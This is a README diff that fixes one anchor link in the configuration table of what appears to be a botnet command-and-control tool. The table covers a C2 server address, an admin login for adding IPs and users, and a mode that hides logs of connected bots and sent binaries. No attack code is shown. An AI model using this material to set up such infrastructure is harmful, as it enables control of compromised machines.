@@ -77,7 +77,7 @@ Setup guide soon...
 
 | Name                    | Type   | Description                                                                                                                      |
 | ----------------------- | ------ | -------------------------------------------------------------------------------------------------------------------------------- |
-| `ImportTheme`           | String | Imports a theme. Read more about customising [here](#theme).                                                                     |
+| `ImportTheme`           | String | Imports a theme. Read more about customising [here](#customisation).                                                                     |
 | `CncServer`             | String | IP:PORT. You must specify a public IP. To get a public IP, enter  ```curl http://ip-api.com/json/?fields=query  ```                                                   |
 | `RootLogin`             | String | Login that has access to admin commands (addip, adduser, etc).                                                                   |
 | `RELEASE_MODE`          | Bool   | Hides logs (new bot connected, bin sent, etc).                                                                                   |
